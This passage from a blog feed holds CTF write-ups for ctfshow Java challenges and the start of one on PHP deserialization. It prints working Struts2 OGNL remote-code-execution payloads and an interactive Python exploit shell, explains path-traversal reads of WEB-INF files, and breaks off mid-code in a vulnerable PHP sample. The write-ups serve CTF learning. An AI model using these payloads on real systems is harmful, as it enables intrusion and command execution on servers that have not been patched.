mbereg_search_init, mbereg_search_getregs, mbereg_search_getpos, mbereg_search_setpos, mysqli_affected_rows, mysqli_autocommit, mysqli_begin_transaction, mysqli_change_user, mysqli_character_set_name, mysqli_close, mysqli_commit, mysqli_connect, mysqli_connect_errno, mysqli_connect_error, mysqli_data_seek, mysqli_dump_debug_info, mysqli_debug, mysqli_errno, mysqli_error, mysqli_error_list, mysqli_stmt_execute, mysqli_execute, mysqli_fetch_field, mysqli_fetch_fields, mysqli_fetch_field_direct, mysqli_fetch_lengths, mysqli_fetch_all, mysqli_fetch_array, mysqli_fetch_assoc, mysqli_fetch_object, mysqli_fetch_row, mysqli_field_count, mysqli_field_seek, mysqli_field_tell, mysqli_free_result, mysqli_get_connection_stats, mysqli_get_client_stats, mysqli_get_charset, mysqli_get_client_info, mysqli_get_client_version, mysqli_get_links_stats, mysqli_get_host_info, mysqli_get_proto_info, mysqli_get_server_info, mysqli_get_server_version, mysqli_get_warnings, mysqli_init, mysqli_info, mysqli_insert_id, mysqli_kill, mysqli_more_results, mysqli_multi_query, mysqli_next_result, mysqli_num_fields, mysqli_num_rows, mysqli_options, mysqli_ping, mysqli_poll, mysqli_prepare, mysqli_report, mysqli_query, mysqli_real_connect, mysqli_real_escape_string, mysqli_real_query, mysqli_reap_async_query, mysqli_release_savepoint, mysqli_rollback, mysqli_savepoint, mysqli_select_db, mysqli_set_charset, mysqli_stmt_affected_rows, mysqli_stmt_attr_get, mysqli_stmt_attr_set, mysqli_stmt_bind_param, mysqli_stmt_bind_result, mysqli_stmt_close, mysqli_stmt_data_seek, mysqli_stmt_errno, mysqli_stmt_error, mysqli_stmt_error_list, mysqli_stmt_fetch, mysqli_stmt_field_count, mysqli_stmt_free_result, mysqli_stmt_get_result, mysqli_stmt_get_warnings, mysqli_stmt_init, mysqli_stmt_insert_id, mysqli_stmt_more_results, mysqli_stmt_next_result, mysqli_stmt_num_rows, mysqli_stmt_param_count, mysqli_stmt_prepare, mysqli_stmt_reset, mysqli_stmt_result_metadata, mysqli_stmt_send_long_data, mysqli_stmt_store_result, mysqli_stmt_sqlstate, mysqli_sqlstate, mysqli_ssl_set, mysqli_stat, mysqli_store_result, mysqli_thread_id, mysqli_thread_safe, mysqli_use_result, mysqli_warning_count, mysqli_refresh, mysqli_escape_string, mysqli_set_opt, posix_kill, posix_getpid, posix_getppid, posix_getuid, posix_setuid, posix_geteuid, posix_seteuid, posix_getgid, posix_setgid, posix_getegid, posix_setegid, posix_getgroups, posix_getlogin, posix_getpgrp, posix_setsid, posix_setpgid, posix_getpgid, posix_getsid, posix_uname, posix_times, posix_ctermid, posix_ttyname, posix_isatty, posix_getcwd, posix_mkfifo, posix_mknod, posix_access, posix_getgrnam, posix_getgrgid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_setrlimit, posix_get_last_error, posix_errno, posix_strerror, posix_initgroups, readline, readline_info, readline_add_history, readline_clear_history, readline_list_history, readline_read_history, readline_write_history, readline_completion_function, readline_callback_handler_install, readline_callback_read_char, readline_callback_handler_remove, readline_redisplay, readline_on_new_line, shmop_open, shmop_read, shmop_close, shmop_size, shmop_write, shmop_delete, simplexml_load_file, simplexml_load_string, simplexml_import_dom, socket_select, socket_create, socket_create_listen, socket_create_pair, socket_accept, socket_set_nonblock, socket_set_block, socket_listen, socket_close, socket_write, socket_read, socket_getsockname, socket_getpeername, socket_connect, socket_strerror, socket_bind, socket_recv, socket_send, socket_recvfrom, socket_sendto, socket_get_option, socket_set_option, socket_shutdown, socket_last_error, socket_clear_error, socket_import_stream, socket_export_stream, socket_sendmsg, socket_recvmsg, socket_cmsg_space, socket_addrinfo_lookup, socket_addrinfo_connect, socket_addrinfo_bind, socket_addrinfo_explain, socket_getopt, socket_setopt, msg_get_queue, msg_send, msg_receive, msg_remove_queue, msg_stat_queue, msg_set_queue, msg_queue_exists, sem_get, sem_acquire, sem_release, sem_remove, shm_attach, shm_remove, shm_detach, shm_put_var, shm_has_var, shm_get_var, shm_remove_var, token_get_all, token_name, xmlwriter_open_uri, xmlwriter_open_memory, xmlwriter_set_indent, xmlwriter_set_indent_string, xmlwriter_start_comment, xmlwriter_end_comment, xmlwriter_start_attribute, xmlwriter_end_attribute, xmlwriter_write_attribute, xmlwriter_start_attribute_ns, xmlwriter_write_attribute_ns, xmlwriter_start_element, xmlwriter_end_element, xmlwriter_full_end_element, xmlwriter_start_element_ns, xmlwriter_write_element, xmlwriter_write_element_ns, xmlwriter_start_pi, xmlwriter_end_pi, xmlwriter_write_pi, xmlwriter_start_cdata, xmlwriter_end_cdata, xmlwriter_write_cdata, xmlwriter_text, xmlwriter_write_raw, xmlwriter_start_document, xmlwriter_end_document, xmlwriter_write_comment, xmlwriter_start_dtd, xmlwriter_end_dtd, xmlwriter_write_dtd, xmlwriter_start_dtd_element, xmlwriter_end_dtd_element, xmlwriter_write_dtd_element, xmlwriter_start_dtd_attlist, xmlwriter_end_dtd_attlist, xmlwriter_write_dtd_attlist, xmlwriter_start_dtd_entity, xmlwriter_end_dtd_entity, xmlwriter_write_dtd_entity, xmlwriter_output_memory, xmlwriter_flush, zip_open, zip_close, zip_read, zip_entry_open, zip_entry_close, zip_entry_read, zip_entry_filesize, zip_entry_name, zip_entry_compressedsize, zip_entry_compressionmethod, opcache_reset, opcache_invalidate, opcache_compile_file, opcache_is_script_cached, opcache_get_configuration, opcache_get_status,</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;suctf-web-upgdstore&quot;&gt;&lt;a href=&quot;#suctf-web-upgdstore&quot; class=&quot;headerlink&quot; title=&quot;[suctf web] upgdstore&quot;&gt;&lt;/a&gt;[suctf web] upgdstore&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow java</title>
    <link href="http://websec.space/2022/03/15/ctfshow%20java/"/>
    <id>http://websec.space/2022/03/15/ctfshow%20java/</id>
    <published>2022-03-14T16:00:00.000Z</published>
    <updated>2022-03-15T09:34:24.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-java"><a href="#ctfshow-java" class="headerlink" title="ctfshow java"></a>ctfshow java</h1><h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p><img src="https://img-blog.csdnimg.cn/a0cbfd8914ed48458a1c20fdb07ad7c8.png" alt="img"></p><p>Structs2框架直接用Struts2Scan.py 开扫</p><p><img src="https://img-blog.csdnimg.cn/abd4696406044196937c62f218f2d7da.png" alt="img"></p><p>太快乐了，挑一个</p><p>-n S2-001</p><h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p>struts2的漏洞</p><p><img src="https://img-blog.csdnimg.cn/ef214a4696ef4affb1efd385c926649d.png" alt="img"></p><p>S2-005</p><h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p>用工具没跑出来来</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>发现age那个窗口执行了。</p><h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p>S2-008</p><h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><blockquote><p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线</p><p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用/helloword.acton?example=<OGNL statement>&amp;(example)(‘xxx’)=1的方法来执行它，从而绕过官方对#、\等特殊字符的防御</p><p>通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行</p><p>影响版本：Struts 2.0.0 - Struts 2.3.1</p></blockquote><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><blockquote><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;</span><br><span class="line">        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p><p>影响版本: 2.1.0 - 2.3.13</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p>脚本</p><h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><p>脚本</p><h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><p>脚本</p><h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><p>脚本</p><h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><p>脚本</p><h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><p>脚本</p><h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><p>脚本</p><h2 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h2><p>脚本</p><h2 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h2><blockquote><p>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用<code>\x00</code>截断</p><p><strong>影响版本</strong>：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p></blockquote><p>上传文件</p><p>更改filename，可以看到下图中命令所在的位置，执行的命令为env</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; b&quot;</span><br></pre></td></tr></table></figure><h3 id="使用00截断（b在hex中是62，找到62前面的一个改成00即可）"><a href="#使用00截断（b在hex中是62，找到62前面的一个改成00即可）" class="headerlink" title="使用00截断（b在hex中是62，找到62前面的一个改成00即可）"></a>使用00截断（b在hex中是62，找到62前面的一个改成00即可）</h3><p><img src="https://img-blog.csdnimg.cn/706a5d928c3c455cb04129fb4cd1f16e.png" alt="img"></p><h2 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h2><blockquote><p>漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用<br>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击</p><p>影响版本: 2.0.0 - 2.3.32</p></blockquote><h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><img src="https://img-blog.csdnimg.cn/5cc3fd251bab4025bc125ceb15409880.png" alt="img" style="zoom: 25%;" /><p>算一下这个学霸题</p><p><img src="https://img-blog.csdnimg.cn/28c1d2eda5c440a28746ee4cd7a7a389.png" alt="img"></p><p>执行了，原来是等于4哇</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个payload一执行env就爆了</p><p>最后用了一把yuxx师傅的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import json,re</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def Poc(url,command):</span><br><span class="line">    header = &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;</span><br><span class="line">    poc = &#123;&quot;name&quot;:&quot;%&#123;(#szgx=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27; \</span><br><span class="line">                          &quot;+command+&quot;&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;&quot;,&quot;age&quot;:&quot;1&quot;,&quot;__checkbox_bustedBefore&quot;:&quot;true&quot;,&quot;description&quot;:&quot;123123&quot;&#125;</span><br><span class="line">    data = urllib.urlencode(poc)</span><br><span class="line">    try:</span><br><span class="line">        result = requests.post(url,data=data,headers=header)</span><br><span class="line">        if result.status_code == 200:</span><br><span class="line">            </span><br><span class="line">            print result.content</span><br><span class="line">    except requests.ConnectionError,e:</span><br><span class="line">        print e</span><br><span class="line"></span><br><span class="line">th = &#123;&quot;url&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    if th.get(&quot;url&quot;) != &quot;&quot;:</span><br><span class="line">        input_cmd = raw_input(&quot;cmd &gt;&gt;: &quot;)</span><br><span class="line">        if input_cmd == &quot;exit&quot;:</span><br><span class="line">            exit()</span><br><span class="line">        elif input_cmd == &#x27;set&#x27;:</span><br><span class="line">            url = raw_input(&quot;set url :&quot;)</span><br><span class="line">            th[&#x27;url&#x27;] = url</span><br><span class="line">        elif input_cmd == &#x27;show url&#x27;:</span><br><span class="line">            print th.get(&quot;url&quot;)</span><br><span class="line">        else:</span><br><span class="line">            Poc(th.get(&quot;url&quot;),input_cmd)</span><br><span class="line">    else:</span><br><span class="line">        url = raw_input(&quot;set url :&quot;)</span><br><span class="line">        th[&quot;url&quot;] = url</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/88c798646c124e66b9ade1dab5357c38.png" alt="img" style="zoom: 67%;" /><h2 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h2><p>脚本</p><h2 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h2><p>用S2-048可执行，虽然这题是S2-053</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;ls&#x27;).getInputStream())).(#q)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后直接脚本打了</p><h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p>需要反编译一下class文件</p><p><img src="https://img-blog.csdnimg.cn/ac56633d3d3b4420b6b7742a6755367d.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/5d268904cad44dac9279f57b11a37035.png" alt="img"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure><h2 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h2><p><img src="https://img-blog.csdnimg.cn/56adb4b3614a45f1aa293275d303cc39.png" alt="img"></p><p>查看源码发现存在任意文件读取，这里动了些马虎眼扯搞了个index.php ，明明是index.jsp</p><p>先查看view-source?file=/WEB-INF/web.xml</p><p><img src="https://img-blog.csdnimg.cn/de814a906bae45e3a44d9df55b1ce5c7.png" alt="img"></p><p>查看其他的/view-source?file=/WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</p><img src="https://img-blog.csdnimg.cn/64024901b08d4aafb3f38a5cc00eaa6c.png" alt="img" style="zoom: 50%;" /><p>访问../../../../../fl3g</p><img src="https://img-blog.csdnimg.cn/1f450097e9874101be11d17f9fe6035b.png" alt="img" style="zoom:67%;" /><h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p><img src="https://img-blog.csdnimg.cn/43edefc6d004438fa8e8307dcb128771.png" alt="img"></p><p>方法同上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow-java&quot;&gt;&lt;a href=&quot;#ctfshow-java&quot; class=&quot;headerlink&quot; title=&quot;ctfshow java&quot;&gt;&lt;/a&gt;ctfshow java&lt;/h1&gt;&lt;h2 id=&quot;web279&quot;&gt;&lt;a href=&quot;#web279&quot;</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow反序列化</title>
    <link href="http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-03-11T16:00:00.000Z</published>
    <updated>2022-03-12T08:36:29.971Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow反序列化"><a href="#ctfshow反序列化" class="headerlink" title="ctfshow反序列化"></a>ctfshow反序列化</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;</span><br><span class="line">            $this-&gt;isVip=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = new ctfShowUser();</span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读懂代码意思即可比较简单</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxx&amp;passowrd=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        